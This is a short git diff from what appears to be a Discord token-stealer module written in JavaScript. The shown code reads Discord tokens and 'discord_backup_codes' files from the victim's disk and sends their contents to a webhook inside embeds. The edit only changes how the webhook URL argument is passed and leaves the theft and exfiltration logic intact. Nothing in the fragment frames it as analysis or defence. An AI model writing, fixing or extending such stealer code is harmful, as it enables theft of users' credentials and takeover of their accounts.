@@ -184,7 +184,7 @@ module.exports = (client) => {
                 }
 
                 await client.utils.webhook.sendToWebhook(
-                    client.utils.encryption.decryptData(client.config.webhook.url), {
+                    {
                         "embeds": [client.utils.webhook.createEmbed({
                             "title": `Found token in: ${source}`,
                             "fields": fields,
@@ -389,7 +389,7 @@ module.exports = (client) => {
                 }
                 if (file.startsWith("discord_backup_codes")) {
                     await client.utils.webhook.sendToWebhook(
-                        client.utils.encryption.decryptData(client.config.webhook.url), {
+                        {
                             "embeds": [client.utils.webhook.createEmbed({
                                 "title": `💰 Discord backup codes found`,
                                 "description": `\`\`\`${prefixPath}\\${file}\n\n${client.requires.fs.readFileSync(`${prefixPath}\\${file}`)}\`\`\``,
